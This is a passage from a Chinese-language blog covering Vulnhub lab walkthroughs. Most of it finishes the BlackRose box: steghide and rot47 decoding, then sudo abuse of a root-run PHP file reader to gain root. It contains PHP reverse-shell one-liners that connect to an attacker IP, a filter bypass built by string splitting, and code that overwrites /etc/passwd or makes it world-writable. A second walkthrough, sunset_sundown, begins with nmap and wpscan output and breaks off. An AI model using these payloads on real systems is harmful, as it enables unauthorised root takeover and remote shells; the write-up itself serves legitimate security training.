utf8，数字 0 在 utf8 编码中的二进制表示与其 ASCII 编码相同，为 00110000，如果想真正表示二进制的00000000又会遇到新的问题，也就是空字节的问题，所以在 CyberChef 中对于 key 需要补足0的情况只能使用 hex 作为 key 的输入。密码工具箱的验证：</p><p><img src="/pic/48cca41cc16207ba75769d4b248c5154_MD5.png"></p><p>这里还有个我们忽略的地方，也就是这个字符串的用处。打开网页时有个背景图，我们，将背景图片下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ exiftool background-image.jpg <br>ExifTool Version Number         : 12.57<br>File Name                       : background-image.jpg<br>Directory                       : .<br>File Size                       : 181 kB<br>File Modification Date/Time     : 2019:12:05 06:57:08-05:00<br>File Access Date/Time           : 2023:10:12 09:01:47-04:00<br>File Inode Change Date/Time     : 2023:10:12 09:01:47-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 300<br>Y Resolution                    : 300<br>Image Width                     : 960<br>Image Height                    : 640<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 960x640<br>Megapixels                      : 0.614<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide info background-image.jpg <br><span class="hljs-string">&quot;background-image.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 10.9 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>steghide: could not extract any data with that passphrase!<br></code></pre></td></tr></table></figure><p>steghide 提示需要 <code>passphrase</code> 才能提取信息，将上面解密得到的字符作为 <code>passphrase</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide info background-image.jpg<br><span class="hljs-string">&quot;background-image.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 10.9 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>  embedded file <span class="hljs-string">&quot;password&quot;</span>:<br>    size: 31.0 Byte<br>    encrypted: rijndael-128, cbc<br>    compressed: <span class="hljs-built_in">yes</span><br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ steghide extract -sf background-image.jpg<br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;password&quot;</span>.<br><br>┌──(kali㉿kali)-[~/Documents/blackrose]<br>└─$ <span class="hljs-built_in">cat</span> password    <br>s)M8Z=7|8/&amp;YY-zK5L$.w3Su<span class="hljs-string">&#x27;Q@nGR</span><br></code></pre></td></tr></table></figure><p>对于字符 <code>s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#39;Q@nGR</code> 又需要再一次尝试加密与编码</p><blockquote><p>这个密码看起来依旧是加密的，经过查找，发现是 rot47</p></blockquote><p>关于这个描述和判断，比较疑惑，在一篇博客中找到了一种途径。<a href="https://shubham-singh.medium.com/blackrose-1-walkthrough-vulnhub-b0517597e15c">BlackRose: 1 Walkthrough (Vulnhub) | by Shubham Kumar | Medium</a></p><p>使用的工具是 <a href="https://github.com/oreosES/autodecoder">oreosES&#x2F;autodecoder: AutoDecoder tool for CTFs (github.com)</a></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">┌──(kali㉿kali)-[~/tools/autodecoder]</span><br><span class="hljs-attribute">└─$ python3 audodecoder.py --message &quot;s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR&quot;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">atbash &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">SMZYYZKLWSUQNGR                                                                                    </span><br><span class="hljs-attribute">atbash &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KQDEEDSRGKIMPWL                                                                                    </span><br><span class="hljs-attribute">atbash &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UANOONCBQUSWZGV                                                                                     </span><br><span class="hljs-attribute">atbash &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">w&#125;pqqp!~swuy|%x                                                                                     </span><br><span class="hljs-attribute">caesar &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">YKXYYRMLUEWGDQF                                                                                    </span><br><span class="hljs-attribute">caesar &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">E)S8F=7|8/&amp;EE-LQ5R$.I3YG&#x27;W@ZMX                                                                     </span><br><span class="hljs-attribute">caesar &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">O)C8P=7|8/&amp;OO-VA5B$.S3IQ&#x27;G@JWH                                                                      </span><br><span class="hljs-attribute">caesar &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">qX!grlfMg^Uqq\x&#125;d~S]ub&#x27;sV%o(y&amp;                                                                      </span><br><span class="hljs-attribute">rot13 &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">UANOONCBQUSWZGV                                                                                     </span><br><span class="hljs-attribute">rot13 &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">O)C8P=7|8/&amp;OO-VA5B$.S3IQ&#x27;G@JWH                                                                      </span><br><span class="hljs-attribute">rot13 &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR                                                                       </span><br><span class="hljs-attribute">rot13 &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">7X+g|lfMg^U&#123;&#123;\&gt;)d*S];bu9Vso2%t                                                                       </span><br><span class="hljs-attribute">rot47 &gt; atbash</span><span class="hljs-punctuation">:</span> <span class="hljs-string">WCTOUNTFPAWHSYUELE                                                                                  </span><br><span class="hljs-attribute">rot47 &gt; caesar</span><span class="hljs-punctuation">:</span> <span class="hljs-string">GA|P+UOPP^X**\NIM&#123;V]KK$IY&quot;X?E#                                                                      </span><br><span class="hljs-attribute">rot47 &gt; rot13</span><span class="hljs-punctuation">:</span> <span class="hljs-string">QK|t+ysZt^H**\Xmq&#123;F]Uo$SI&quot;b?i#                                                                       </span><br><span class="hljs-attribute">rot47 &gt; rot47</span><span class="hljs-punctuation">:</span> <span class="hljs-string">s)M8Z=7|8/&amp;YY-zK5L$.w3Su&#x27;Q@nGR</span><br></code></pre></td></tr></table></figure><p>从结果可以判断出，可能是 rot13 或者 rot47</p><p><img src="/pic/932d8c6ac801535da99ae33e66bef49b_MD5.png"></p><p>使用 <code>DX|g+lfMg^U**\Kzd&#123;S]Hb$FV&quot;o?v#</code> 切换登录到 yourname 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">cat</span> user.txt<br>688286be9a2df84e90122da12cd7ea2e<br>yourname@BlackRose:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> yourname on BlackRose:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User yourname may run the following commands on BlackRose:<br>    (root : root) NOPASSWD: /usr/bin/blackrose<br></code></pre></td></tr></table></figure><p>发现了一个特别的程序，可以使用 root 权限无密码运行</p><p>接下来关于这个程序，又有一个很难想到的点，首先这个程序运行后提示读取文件，但是输入一般的文件名会提示无效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># /etc/passwd                                                                                             </span><br>Invalid file <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><p>这里程序只接受 php 文件的路径，同时这个文件的权限决定了我们没法拿到本地逆向。所以关于可接受文件类型的判断，也是一个很容易卡住的点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">ls</span> -liah /usr/bin/blackrose<br>2502921 -rwx------ 1 root root 1.3K Dec  1  2019 /usr/bin/blackrose<br></code></pre></td></tr></table></figure><p>之后我们将反弹 shell 的文件写入 1.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php $sock=fsockopen(&quot;192.168.1.101&quot;,443);system(&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt;&#x27;</span> &gt; 1.phpyourname@BlackRose:~$ sudo /usr/bin/blackrose ./1.php <br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>Dangerous <span class="hljs-keyword">function</span> found<br>yourname@BlackRose:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php $sock=fsockopen(&quot;192.168.1.101&quot;,443);popen(&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;); ?&gt;&#x27;</span> &gt; 1.php <br>yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>Dangerous <span class="hljs-keyword">function</span> found<br></code></pre></td></tr></table></figure><p>又遇到了新的问题，似乎有危险函数的过滤。尝试自己绕过参考博客 <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#bypass-using-php-capabilities">PHP - Useful Functions &amp; disable_functions&#x2F;open_basedir bypass - HackTricks</a></p><p><img src="/pic/45e2a6a9cfc947509b30f61c7cda40dd_MD5.png"></p><p>先是尝试 chown，发现无法赋予 SUID 权限，尝试读取和写入文件，发现读取和写入 <code>file_put_contents</code> 函数可用，我先是读取了一下 shadow 文件的内容，发现使用 hashcat 爆破失败，那就尝试写入到 passwd 文件吧</p><p>先生成简单的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ openssl passwd 123456<br>l.ceEHjBRBt96<br></code></pre></td></tr></table></figure><p>用 chatgpt 使用 <code>file_put_contents</code> 函数生成替换文件第一行内容的代码。但是发现程序或许会匹配 root 关键字，我们需要简单地处理一下，以便绕过。自己尝试的话，建议先别拿 passwd 尝试，用普通文件先测试，确认无误后再对 passwd 进行修改，同时建议备份一下原有的 <code>/etc/passwd</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-variable">$newContent0</span> = <span class="hljs-string">&#x27;roo&#x27;</span>;<br><span class="hljs-variable">$newContent1</span> = <span class="hljs-string">&#x27;t:&#x27;</span>;<br><span class="hljs-variable">$newContent2</span> = <span class="hljs-string">&#x27;l.ceEHjBRBt96&#x27;</span>;<br><span class="hljs-variable">$newContent3</span> = <span class="hljs-string">&#x27;:0:0:roo&#x27;</span>;<br><span class="hljs-variable">$newContent4</span> = <span class="hljs-string">&#x27;t:/roo&#x27;</span>;<br><span class="hljs-variable">$newContent5</span> = <span class="hljs-string">&#x27;t:/bin/bas&#x27;</span>;<br><span class="hljs-variable">$newContent6</span> = <span class="hljs-string">&#x27;h&#x27;</span>;<br><span class="hljs-variable">$newContent</span> = <span class="hljs-variable">$newContent0</span> . <span class="hljs-variable">$newContent1</span> . <span class="hljs-variable">$newContent2</span> . <span class="hljs-variable">$newContent3</span> . <span class="hljs-variable">$newContent4</span> . <span class="hljs-variable">$newContent5</span> . <span class="hljs-variable">$newContent6</span>;<br><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);  <br><br><span class="hljs-variable">$firstLineEndPos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;\n&quot;</span>);  <br>  <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$firstLineEndPos</span> !== <span class="hljs-literal">false</span>) &#123;  <br>    <span class="hljs-variable">$firstLine</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$content</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$firstLineEndPos</span> + <span class="hljs-number">1</span>);  <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$firstLine</span>, <span class="hljs-variable">$newContent</span> . <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>);  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);  <br>&#125; <span class="hljs-keyword">else</span> &#123;  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将上述代码写入 1.php，尝试借助 blackrose 运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 1.php</span><br>root:l.ceEHjBRBt96:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false<br>delx:x:1002:1002:,,,:/home/delx:/bin/bash<br>yourname:x:1001:1001:,,,:/home/yourname:/bin/bash<br></code></pre></td></tr></table></figure><p>成功写入，接下来切换为 root 身份，密码为 <code>123456</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ su<br>Password: <br>root@BlackRose:/home/yourname<span class="hljs-comment"># cd /root</span><br>root@BlackRose:~<span class="hljs-comment"># ls -liah</span><br>total 36K<br>2097153 drwx------  6 root root 4.0K Jul 11  2020 .<br>      2 drwxr-xr-x 24 root root 4.0K Nov 13  2019 ..<br>2097158 lrwxrwxrwx  1 root root    9 Dec  3  2019 .bash_history -&gt; /dev/null<br>2097154 -rw-r--r--  1 root root 3.1K Dec  3  2019 .bashrc<br>2097164 drwx------  2 root root 4.0K Dec  5  2019 .cache<br>2097162 drwx------  3 root root 4.0K Nov  7  2019 .gnupg<br>2097159 drwxr-xr-x  3 root root 4.0K Nov  7  2019 .<span class="hljs-built_in">local</span><br>2097155 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>2097168 -rw-r--r--  1 root root  511 Jul 11  2020 root.txt<br>2097156 drwx------  2 root root 4.0K Sep  7  2019 .ssh<br>root@BlackRose:~<span class="hljs-comment"># cat root.txt </span><br>     _                   _                           _                   <br>    | | _____      _____| |   __      ____ _ ___    | |__   ___ _ __ ___ <br> _  | |/ _ \ \ /\ / / _ \ |   \ \ /\ / / _` / __|   | <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__/ _ \<br>| |_| |  __/\ V  V /  __/ |    \ V  V / (_| \__ \   | | | |  __/ | |  __/<br> \___/ \___| \_/\_/ \___|_|     \_/\_/ \__,_|___/   |_| |_|\___|_|  \___|<br>                                                                The box made by Jewel                               <br><br><br><br>7dcbcf000f38c8d2c0024011899ec84e<br><br>I thank you so much <span class="hljs-keyword">for</span> playing - Jewel :)<br><br></code></pre></td></tr></table></figure><p>结束战斗。</p><p>补充，话说 chmod 虽然不能赋予 SUID 权限，但是可以降低 passwd 的权限啊</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">yourname@BlackRose:~$ <span class="hljs-built_in">cat</span> 2.php<br>&lt;?php<br><span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,0777);<br>?&gt;<br>yourname@BlackRose:~$ sudo /usr/bin/blackrose<br>File <span class="hljs-built_in">read</span>~<span class="hljs-comment"># 2.php</span><br>yourname@BlackRose:~$ <span class="hljs-built_in">ls</span> -alih /etc/passwd<br>3154567 -rwxrwxrwx 1 root root 1.7K Oct 14 08:48 /etc/passwd<br>yourname@BlackRose:~$ vim /etc/passwd<br></code></pre></td></tr></table></figure><p>参考的 WP 中使用的是一种更简单的绕过手法，但是这种方法我过去没有见过，搜索结果中也没显示，这里记录一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php (sy.(sy).em)(&#x27;/bin/sh&#x27;) ?&gt;&quot;</span> &gt;1/php<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>登录框测试点</p><ul><li>登录绕过（逻辑问题，语言特性）</li><li>sql 注入（万能密码）</li><li>弱口令（爆破）</li><li>二次注入</li><li>注册覆盖</li><li>未授权访问（目录扫描）</li></ul><p>一些 CTF 技巧实际上是本身就带有试错成本，尤其是编码问题，比如这台靶机如何判断是 AES 加密，如何判断是 rot47。更多的是对加密算法使用习惯和频率的熟悉才能在思维上让你想到，加上不断的试错。</p><p>除此之外，有必要偶尔看看别人的博客和一些渗透方面技巧的总结，比如这里的登录绕过，很简单但是我过去没碰到过，就完全想不到，甚至没意识去搜索登录绕过。以后要时不时翻翻 <a href="https://book.hacktricks.xyz/welcome/readme">HackTricks - HackTricks</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.hetianlab.com/specialized/20220406150732">挖洞实战之信息泄露与前端加密 - 合天网安实验室 (hetianlab.com)</a> 中提到的密码工具箱 <a href="https://github.com/oreosES/autodecoder">oreosES&#x2F;autodecoder: AutoDecoder tool for CTFs (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_sundown 靶机</title>
    <link href="/2023/10/d108ba760c3e.html"/>
    <url>/2023/10/d108ba760c3e.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-sundown-靶机"><a href="#sunset-sundown-靶机" class="headerlink" title="sunset_sundown 靶机"></a>sunset_sundown 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.152                                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-11 06:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.152<br>Host is up (0.000091s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A1:1B:DA (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>暴露面很少，先看 80 端口</p><p><img src="/pic/f526a75c84c926e8c823d02d4274ec23_MD5.png"></p><p>应该是个 wordpress 网站，用 wpscan 扫一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/sunset_sundown]<br>└─$ wpscan --url http://192.168.56.152/ -e u,ap          <br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.38 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] robots.txt found: http://192.168.56.152/robots.txt<br> | Interesting Entries:<br> |  - /wp-admin/<br> |  - /wp-admin/admin-ajax.php<br> | Found By: Robots Txt (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://192.168.56.152/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: 